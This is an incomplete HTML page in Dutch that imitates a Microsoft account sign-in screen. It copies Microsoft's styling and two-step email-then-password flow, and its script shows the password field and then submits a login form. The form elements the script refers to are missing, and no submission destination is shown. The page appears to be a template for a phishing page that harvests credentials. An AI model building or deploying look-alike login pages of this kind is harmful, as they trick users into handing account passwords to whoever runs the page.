<html lang="nl">

<head>

    <title>Aanmelden bij uw account</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(90deg, #e6dcd8 0%, #d5e0d1 50%, #d8e1e8 100% );
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #000000;
        }

        a{
            text-decoration: none;
            color: #000000;
        }

        .container {
            width: 440px;
            padding: 40px;
            display: flex;
            flex-direction: column;
        }

        .aanmelden-container {
            background-color: #ffffff;
            padding: 44px;
        }

        .logo {
            display: flex;
            gap: 5px;
            align-items: center;
            margin-bottom: 20px;
        }

        .microsoft-logo {
            font-size: 20px;
            font-weight: 300;
            color: #000000;
            font-weight: 600;
            color: #737373;
        }

        p {
            font-size: 13px;
        }

        .login-title {
            font-size: 24px;

            font-weight: 600;
        }

        input[type="email"] {
            width: 100%;
            padding: 10px 0;
            border: none;
            border-bottom: 1px solid #767676;
            border-radius: 0;
            font-size: 16px;
            background-color: transparent;
            font-size: 15px;
        }

        input[type="password"]{
            width: 100%;
            padding: 10px 0;
            border: none;
            border-bottom: 1px solid #767676;
            border-radius: 0;
            font-size: 16px;
            background-color: transparent;
            font-size: 15px;
            display: none;
        }

        .input-field:focus{
            outline: none;
        }

        .links-container {
            margin: 20px 0;
        }

        .link {
            color: #0067b8;
            text-decoration: none;
            font-size: 13px;
            margin-bottom: 12px;
        }

        .link:hover {
            text-decoration: underline;
        }

        .buttons {
            display: flex;
            gap: 5px;
            float: right;
        }

        .next-button {
            background-color: #0067b8;
            color: white;
            border: none;
            padding: 10px 24px;
            font-size: 14px;
            cursor: pointer;
        }

        .next-button:hover{
            background-color: #015799;
        }

        .back-button {
            background-color: #cccccc;
            color: white;
            border: none;
            padding: 0px 30px;
            font-size: 14px;
            cursor: pointer;
            color: black;
        }

        .back-button:hover{
            background-color: #b1afaf;
        }

        .options-container {
            margin-top: 30px;
            padding: 10px 45px;
            background-color: white;
            cursor: pointer;
            text-decoration: none;
            color: black;
            display: flex;
            align-items: center;
        }

        .options-container:hover {
            background-color: #e6e6e6;
        }

        .options-title {
            font-size: 15px;
            margin-left: 10px;
            margin-top: 0; 
            margin-bottom: 0;
        }

        .footer {
            margin-top: 40px;
            font-size: 12px;
            color: #000000;
            text-align: center;
        }

        .a {
            fill: none;
        }

        .b {
            fill: #404040;
        }

        @media (max-width: 600px) {
    body {
        background: #ffffff;
        display: flex;
        justify-content: center;
        align-items: flex-start;
        padding-top: 20px;
        height: auto;
    }

    .container {
        position: static;
        width: 100%;
        max-width: 440px;
        padding: 20px;
        margin: 0 auto;
    }

    .aanmelden-container {
        padding: 20px;
        background-color: #ffffff;
        box-shadow: none;
    }

    .options-container {
        border: 1px solid #d3d3d3;
        padding: 12px;
        margin-top: 20px;
    }

    .buttons {
        justify-content: flex-end;
    }
}
    </style>
</head>

<body>
    <div class="container">

        <div class="aanmelden-container">
            <div class="logo">

    </div>
    
    <script>
        document.getElementById('next-button').addEventListener('click', function () {
          const emailField = document.getElementById('email');
          const passwordField = document.getElementById('password');
    
          if (passwordField.style.display === 'none' || passwordField.style.display === '') {
    
            if (emailField.value.trim() === '') {
              emailField.focus();
              return;
            }
    
            passwordField.style.display = 'block';
            passwordField.focus();
    
          } else {
            if (passwordField.value.trim() === '') {
              passwordField.focus();
              return;
            }
    
            document.getElementById('login-form').submit();
          }
        });
      </script>
